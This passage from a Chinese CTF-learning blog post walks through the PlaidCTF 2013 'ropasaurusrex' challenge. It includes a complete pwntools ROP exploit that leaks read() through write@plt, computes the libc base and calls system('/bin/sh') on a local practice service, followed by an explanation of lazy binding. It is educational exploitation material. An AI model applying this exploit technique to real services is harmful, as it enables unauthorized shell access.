+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wings@sw:~/桌面/Rop$ file ./ropasaurusrex</div><div class="line">./ropasaurusrex: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.18, BuildID[sha1]=96997aacd6ee7889b99dc156d83c9d205eb58092, stripped</div></pre></td></tr></table></figure>
+<p>我们还知道的一点是，程序是32位，所以我们不需要像第一个题那样去找寄存器 gadget。<br/>在main函数中有一个<code>write</code>函数，我们可以通过rop，来进行信息泄漏。所以攻击思大概是：</p>
+<ol>
+<li>构造payload leak 内存中的一个函数地址，比如 read()</li>
+<li>计算libc base</li>
+<li>构造payload get shell</li>
+</ol>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">debug = <span class="number">1</span></div><div class="line">elf = ELF(<span class="string">'./ropasaurusrex'</span>)</div><div class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</div><div class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</div><div class="line"></div><div class="line">bof = <span class="number">0x80483f4</span> <span class="comment"># the vulnerable function</span></div><div class="line">buffer_len = <span class="number">0x88</span></div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"><span class="comment">#p = remote(args.host, args.port)</span></div><div class="line"><span class="comment">#p = process('./ropasaurusrex')</span></div><div class="line">p = remote(<span class="string">'127.0.0.1'</span>,<span class="number">10002</span>)</div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * buffer_len</div><div class="line">payload += <span class="string">'AAAA'</span> <span class="comment"># saved ebp</span></div><div class="line">payload += p32(elf.symbols[<span class="string">'write'</span>])</div><div class="line">payload += p32(bof)</div><div class="line">payload += p32(<span class="number">1</span>) <span class="comment"># stdout</span></div><div class="line">payload += p32(elf.got[<span class="string">'read'</span>])</div><div class="line">payload += p32(<span class="number">4</span>) <span class="comment"># len</span></div><div class="line">p.send(payload)</div><div class="line">resp = p.recvn(<span class="number">4</span>)</div><div class="line">read = u32(resp)</div><div class="line">libc_base = read - libc.symbols[<span class="string">'read'</span>]</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * buffer_len</div><div class="line">payload += <span class="string">'AAAA'</span> <span class="comment"># saved ebp</span></div><div class="line">payload += p32(libc_base + libc.symbols[<span class="string">'system'</span>])</div><div class="line">payload += <span class="string">'AAAA'</span> <span class="comment"># cont</span></div><div class="line">payload += p32(libc_base + next(libc.search(<span class="string">'/bin/sh'</span>)))</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.sendline(<span class="string">'ls'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<hr/>
+<p>小结一下：<br/>read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 - 链接、装载与库》这本书）</p>
+<h2 id="上面的内容来自蒸米-一步一步-rop"><a class="headerlink" href="#上面的内容来自蒸米-一步一步-rop" title="上面的内容来自蒸米 -一步一步 rop"></a>上面的内容来自蒸米 -一步一步 rop</h2><p>做了两个简单的rop 第一个的64位，第二个是32位，基本上 也能体会到两者的区别了，一者是寄存器传参，一者是栈传参。至于AliCTF的vsvs ，我没找到Bin程序，所以这里就不单独分析了。我们看看别人的wp，例如链接<a href="https://segmentfault.com/a/1190000005718685" rel="external" target="_blank">https://segmentfault.com/a/1190000005718685</a></p>
+<p>下一个内容准备学习 VROP，一种利用signal机制的ROP技术。</p>
+</div>
+</div>
+<div class="copyright">
+<p><span>本文标题:</span><a href="/2017/03/19/stack-overflow-two/">基础栈溢出复习 二 之 ROP</a></p>
+<p><span>文章作者:</span><a href="/" title="访问 Swing|浮生若梦 的个人博客">Swing|浮生若梦</a></p>
+<p><span>发布时间:</span>2017年03月19日 - 00时00分</p>
+<p><span>最后更新:</span>2017年04月07日 - 21时20分</p>
+<p>
+<span>原始链接:</span><a class="post-url" href="/2017/03/19/stack-overflow-two/" title="基础栈溢出复习 二 之 ROP">http://bestwing.me/2017/03/19/stack-overflow-two/</a>
+<span class="copy-path" data-clipboard-text="原文: http://bestwing.me/2017/03/19/stack-overflow-two/　　作者: Swing|浮生若梦" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+<script src="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/clipboard.min.js"></script>
+<script> var clipboard = new Clipboard('.copy-path'); </script>
+</p>
+<p>
+<span>许可协议:</span><i class="fa fa-creative-commons"></i> <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="license" target="_blank" title="中国大陆 (CC BY-NC-SA 3.0 CN)">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+</div>
+<nav id="article-nav">
+<a class="article-nav-link-wrap" href="/2017/03/20/stack-overflow-three/" id="article-nav-newer">
+<strong class="article-nav-caption">&lt;</strong>
+<div class="article-nav-title">
+        
+          基础栈溢出复习 三 之 SROP
+        
+      </div>
+</a>
+<a class="article-nav-link-wrap" href="/2017/03/18/stack-overflow-one/" id="article-nav-older">
+<div class="article-nav-title">基础栈溢出复习 之基础</div>
+<strong class="article-nav-caption">&gt;</strong>
+</a>
+</nav>
+<!-- -- ���Ӿ���ͼ�� ---->
+<div class="post-donate">
+<div class="donate_bar center" id="donate_board">
+<a class="btn_donate" href="javascript:;" id="btn_donate" title="����"></a>
+<span class="donate_txt">
+           ↑<br/>
+		   如果觉得文章对你有用，不妨赏一点小钱吧！
+        </span>
+<br/>
+</div>
+<div class="donate_bar center hidden" id="donate_guide">
+<!-- ֧��������ͼ�� -->
+<img alt="֧��������" src="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/zhifubao.jpg"/>
+<!-- ΢�Ŵ���ͼ�� -->
+<img alt="΢�Ŵ���" src="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/weixin.jpg"/>
+</div>
+<script type="text/javascript">
+		document.getElementById('btn_donate').onclick = function(){
+			$('#donate_board').addClass('hidden');
+			$('#donate_guide').removeClass('hidden');
+		}
+	</script>
+</div>
+<!-- -- ���Ӿ���ͼ�� ---->
+</article>
+<div class="toc-article" id="toc">
+<strong class="toc-title">文章目录</strong>
+<ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#现代栈溢出利用技术基础：ROP"><span class="toc-number">1.</span> <span class="toc-text">现代栈溢出利用技术基础：ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CTF中ROP的常规套路"><span class="toc-number">1.1.</span> <span class="toc-text">CTF中ROP的常规套路:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Defcon-2015-Qualifier：R0pbaby"><span class="toc-number">1.2.</span> <span class="toc-text">Defcon 2015 Qualifier：R0pbaby</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#如何找到-pop-rdi"><span class="toc-number">1.3.</span> <span class="toc-text">如何找到 pop rdi</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PlaidCTF-2013-ropasaurusrex"><span class="toc-number">1.4.</span> <span class="toc-text">PlaidCTF 2013: ropasaurusrex</span></a></li></ol></li></ol></div></div></div></div></body></html><li class="toc-item toc-level-2"><a class="toc-link" href="#上面的内容来自蒸米-一步一步-rop"><span class="toc-number"></span> <span class="toc-text">上面的内容来自蒸米 -一步一步 rop</span></a>
+</li>
+<input id="tocButton" title="点击按钮隐藏或者显示文章目录" type="button" value="隐藏目录"/>
+<script src="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+<div class="share">
+<div class="bdsharebuttonbox">
+<a class="bds_more" data-cmd="more" href="#"></a>
+<a class="bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
+<a class="bds_sqq" data-cmd="sqq" href="#" title="分享给 QQ 好友"></a>
+<a class="bds_copy" data-cmd="copy" href="#" title="复制网址"></a>
+<a class="bds_mail" data-cmd="mail" href="#" title="通过邮件分享"></a>
+<a class="bds_weixin" data-cmd="weixin" href="#" title="生成文章二维码"></a>
+</div>
+<script>
+        window._bd_share_config={
+            "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+    </script>
+</div>
+<div class="bdsharebuttonbox">
+<a class="fx fa-weibo bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
+<a class="fx fa-weixin bds_weixin" data-cmd="weixin" href="#" title="分享到微信"></a>
+<a class="fx fa-qq bds_sqq" data-cmd="sqq" href="#" title="分享到QQ好友"></a>
+<a class="fx fa-facebook-official bds_fbook" data-cmd="fbook" href="#" title="分享到Facebook"></a>
+<a class="fx fa-twitter bds_twi" data-cmd="twi" href="#" title="分享到Twitter"></a>
+<a class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" href="#" title="分享到linkedin"></a>
+<a class="fx fa-files-o bds_copy" data-cmd="copy" href="#" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+<div class="duoshuo" id="comments">
+<!-- 多说评论框 start -->
+<div class="ds-thread" data-thread-key="2017/03/19/stack-overflow-two/" data-title="基础栈溢出复习 二 之 ROP" data-url="http://bestwing.me/2017/03/19/stack-overflow-two/"></div>
+<!-- 多说评论框 end -->
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+    var duoshuoQuery = {short_name:"WinMin"};
+    (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = '/js/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+         || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+    </script>
+<!-- 多说公共JS代码 end -->
+</div>
+<div class="scroll" id="post-nav-button">
+<a href="/2017/03/20/stack-overflow-three/" title="上一篇: 基础栈溢出复习 三 之 SROP">
+<i class="fa fa-angle-left"></i>
+</a>
+<a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+<a href="/2017/03/18/stack-overflow-one/" title="下一篇: 基础栈溢出复习 之基础">
+<i class="fa fa-angle-right"></i>
+</a>
+</div>
+<ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/07/2017-SSCTF-Pwn/">2017- SSCTF-Pwn250</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/01/2017-defcon-peROPdo/">2017 DEFCON ---  peROPdo writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/23/2017-360chunqiu-online/">2017 360春秋杯线上 部分Pwn writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/23/after-upgrade-gdb-wont-attach-to-process/">解决升级pwntools  gdb.attach不能弹起gdb</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/17/cstc-xatu-writeup/">第三届全国网络空间安全技术大赛(线上初赛)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/10/write-kernel-exploits-2/">linux-kernel expoit  study (3)---栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/write-kernel-exploits-1/">linux-kernel expoit  study (3)---NULL dereference</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/06/add-a-system-call/">linux-kernel expoit  study (2)---添加系统调用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/04/Complie-linux-kernel-and-running-it-using-qemu/">linux-kernel expoit  study（1） ---编译并用qemu运行内核</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/01/hoo_free/">Hook_free  解决保护全开的问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/30/《程序员的自我修养》读书笔记/">《程序员的自我修养》读书笔记---ELF文件结构</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/29/2017-0CTF-部分Pwn/">2017年 0CTF---部分Pwn writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/28/愿你出走半生，归来仍是少年/">不忘初心</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/26/markdown图片设置方法/">Markdown中对图片进行居中,设置大小等操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/24/stack-overflow-four/">基础栈溢出复习 四 之 BROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/stack-overflow-three/">基础栈溢出复习 三 之 SROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/19/stack-overflow-two/">基础栈溢出复习 二 之 ROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/18/stack-overflow-one/">基础栈溢出复习 之基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/15/2017-NJCTF-part-writeup/">2017 XCTF 南京站　线上赛　NJCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/08/angr-study/">angr初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/28/ichunqiu-CTF-Pwn-2017-2/">i 春秋-CTF-Pwn-2017-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/python-沙箱-逃逸/">Python沙箱逃逸</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/15/Memory Leak &amp; DynELF/">leak技巧以及DynELF的温习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/13/WiFi_Attack/">蹭隔壁的WiFI</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/02/Those-of-the-Breakpoint/">断点的那些事</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/26/使用Git开发使用介绍/">使用Git开发使用介绍</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/19/Windows-Kernel-Exploit-Study-1/">Windows Kernel Exploit Study(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/pwnable刷题日记/">pwnable刷题日记 第一阶梯部分</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/30/one-gadget-rce/">One gadget rce</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/15/CSRF-Preliminary-Study/">CSRF初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/23/ichuqiu-reverse-November/">ichunqiu百度杯-十一月reverse专题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/18/Second Shanghai college students ' network security competition/">第二届上海市大学生网络安全大赛 Re400</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/13/2016-SUCTF-Writeup-pwn/">2016-SUCTF-PWN-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/10/As-a-Software security engineer-must-know-and-read-books-recommended/">作为一个二进制安全学习者必知必读的书籍推荐</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/08/ichuqiu-pwn-November/">ichunqiu百度杯-十一月pwn专题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/22/基于zio的exp初次尝试/">一次基于zio编写pwn的exp的尝试</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/16/2016-sycgeek-Writeup/">Sycsec-极客大挑战-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/29/2016-NUCA-pwn-Writeup/">NUCA---pwn-2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/24/The_hulling_method/">逆向学习——脱壳方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/18/tell_myself/">有时候想想 是得规划一下自己了</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/11/2016-Hs-ctf-SeeSea-writeup/">2016-中国·西安 华山杯 Writeup-SeeSea</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/10/Common types of RSA/">一大波RSA就要来了~~</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/08/2016-NUCA-Reverse-Writeup/">全国高校网安联赛--逆向篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/05/2016-ichunqiu-September/">百度杯 CTF夺旗大赛 ---ichunqiu</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/05/Want to say a bit/">一点想说的</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/27/John the Ripper password cracker/">John 破解rar 或者 zip密码</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/23/wooyun搭建/">记一次在服务器上wooyun搜索站的搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/ubuntu-mount-new-disk/">ubuntu系统新增硬盘空间</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/29/渗透测试/">这是一波 ichunqiu在线挑战攻略 -(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/29/记一次Hexo主题的修改/">记一次Hexo主题修改</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/27/CTF-Misc&amp;Crypto-Tools/">工具以及脚本的整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/04/i春秋30强部分通关指南/">i春秋30强部分write-up</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/04/ichunqiu-Tencent-top30-Pwn/">ichunqiu-Pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/04/浅谈格式化字符串漏洞/">浅谈格式化字符串漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/24/利用阿里云搭建VPN/">利用阿里云搭建VPN</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/04/2016黑客西部大会/">2016黑客西部大会</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/28/2016-Networ-space-security-technology-competition-of-shaanxi/">陕西省网络空间安全技术大赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/26/2016-PCTF-Writup/">Phrack--CTF 整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/25/2015-CCTF-Writeup/">酱油之旅--CCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/14/Hexo-Use/">Hexo 使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/27/Hexo-Theme/">Hexo 主题：SPFK</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/27/Hexo-use-Introduction/">Hexo的使用介绍</a></li></ul>
+<script src="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+<script>
+</script>
+
+<footer id="footer">
+<div class="outer">
+<div id="footer-info">
+<div class="footer-left">
+                © 2017 Swing|浮生若梦
+            </div>
+<div class="footer-right">
+<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+</div>
+<div class="visit">
+<span id="busuanzi_container_site_pv" style="display:none">
+<span id="site-visit">表哥到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+</span>
+</span>
+<span>, </span>
+<span id="busuanzi_container_page_pv" style="display:none">
+<span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+</div>
+</div>
+</footer>
+
+<script src="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/main.js"></script>
+<script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(http://oezgohqzq.bkt.clouddn.com/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+<script src="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/MathJax.jsconfig=TeX-AMS-MML_HTMLorMML" type="text/javascript">
+</script>
+<div class="scroll" id="scroll">
+<a href="#"><i class="fa fa-arrow-up"></i></a>
+<a href="#comments"><i class="fa fa-comments-o"></i></a>
+<a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+<script async="" src="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/busuanzi.pure.mini.js">
+</script>
+<script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
